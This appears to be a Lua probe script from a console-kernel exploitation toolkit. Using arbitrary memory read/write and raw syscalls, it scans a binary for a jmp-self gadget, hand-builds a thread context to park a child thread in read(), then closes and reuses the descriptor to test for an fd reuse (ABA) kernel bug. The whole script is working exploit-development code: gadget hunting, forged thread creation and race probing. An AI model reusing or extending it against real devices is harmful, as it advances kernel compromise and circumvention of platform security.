-- CRASH_CLASS: LOW
-- PROBE 1234b: fd reuse against a blocked read. A child parks in read(fd0) on an empty socketpair;
-- the parent closes fd0 and creates a new socketpair, which should take the same descriptor number;
-- the parent then writes to the NEW peer. If the child wakes and receives the bytes, the blocked
-- read followed the descriptor number rather than the file it was opened on - an fd ABA.
print("=== PROBE 1234b: fd reuse vs blocked read ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local ok,v=pcall(function() return N(memory.read_dword(a)) end) if ok then return v end return -1 end
local function rb(a) local ok,v=pcall(function() return N(memory.read_byte(a)) end) if ok then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end
local function call(tag, fn) local ok, rv = pcall(fn) if not ok then print("  ["..tag.."] PCALL-FAIL") return nil end local h,l = hilo(rv) print(string.format("  [%s] ret=0x%08X_%08X err=%s", tag, h, l, ES())) return rv end
local eb = N(eboot_base)
print(string.format("[0] pid=%d", N(mk(20)())))
local jmp_self = nil
for off = 0, 0x40000, 1 do
  local b0,b1
  do local ok,v = pcall(function() return N(memory.read_byte(eb+off)) end) if ok then b0=v end end
  do local ok,v = pcall(function() return N(memory.read_byte(eb+off+1)) end) if ok then b1=v end end
  if b0 == 0xEB and b1 == 0xFE then jmp_self = eb+off break end
end
if not jmp_self then print("no gadget"); print("=== DONE ===") return end
local STUB = N(syscall.pipe.fn_addr)
local function spawn(rax, rdi, rsi, rdx)
  local stk = N(mk(477)(uint64(0),uint64(0x10000),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)))
  if stk == 0 then return nil end
  local top = stk + 0x10000 - 0x100
  wq(top, uint64(1))   -- unmapped return address: child faults, loader chain calls thr_exit(431)
  local ctx = memory.alloc(0x500)
  for i = 0, 0x4F8, 8 do wq(ctx + i, 0) end
  wq(ctx + 0x48, uint64(rdi)) wq(ctx + 0x50, uint64(rsi)) wq(ctx + 0x58, uint64(rdx)) wq(ctx + 0x78, uint64(rax))
  wq(ctx + 0x0c0, uint64(0x43)) wq(ctx + 0x0e0, uint64(STUB)) wq(ctx + 0x0f8, uint64(top))
  wq(ctx + 0x100, uint64(0x3B)) wq(ctx + 0x108, uint64(0x480)) wd(ctx + 0x0d0, 0) wq(ctx + 0x110, uint64(0x10000))
  local tb = memory.alloc(8) wq(tb, uint64(0xDEADDEAD))
  local ok, rv = pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0),uint64(0),uint64(0),uint64(0)) end)
  return N(uint64(tb))
end
local sv = memory.alloc(8) wd(sv,0) wd(sv+4,0)
mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv))
local fd0, fd1 = rd(sv), rd(sv+4)
print(string.format("[1] socketpair %d %d", fd0, fd1))
if fd0 <= 0 then print("=== DONE ===") return end
local buf = memory.alloc(0x40)
for i=0,0x3C,4 do wd(buf+i,0xAAAAAAAA) end
local tid = spawn(3, fd0, N(uint64(buf)), 16)
print(string.format("    child read(fd=%d) tid=0x%X", fd0, tid or 0))
local ts = memory.alloc(16) wq(ts,0) wq(ts+8, 30000000)
pcall(function() mk(240)(uint64(ts),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
print("[2] close the read end and take the descriptor again")
call("close(fd0)", function() return mk(6)(uint64(fd0),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
local s2 = memory.alloc(8) wd(s2,0) wd(s2+4,0)
mk(135)(uint64(1),uint64(1),uint64(0),uint64(s2))
local a, b = rd(s2), rd(s2+4)
print(string.format("    new socketpair %d %d (fd0 was %d, reused=%s)", a, b, fd0, tostring(a==fd0 or b==fd0)))
print("[3] write to the new peer and see whether the blocked child wakes")
local wb = memory.alloc(16)
for i=0,12,4 do wd(wb+i, 0x4B4B4B4B) end
if a > 0 then
  local peer = (a == fd0) and b or a
  call("write(new peer)", function() return mk(4)(uint64(peer),uint64(wb),uint64(8),uint64(0),uint64(0),uint64(0)) end)
end
wq(ts,0) wq(ts+8, 30000000)
pcall(function() mk(240)(uint64(ts),uint64(0),uint64(0),uint64(0),uint64(0),uint64(0)) end)
print(string.format("    child buffer: %08X %08X %08X %08X", rd(buf), rd(buf+4), rd(buf+8), rd(buf+12)))
print(string.format("    (0x4B4B4B4B here would mean the read followed the descriptor NUMBER)"))
print(string.format("[Z] pid_end=%d", N(mk(20)())))
print("=== DONE ===")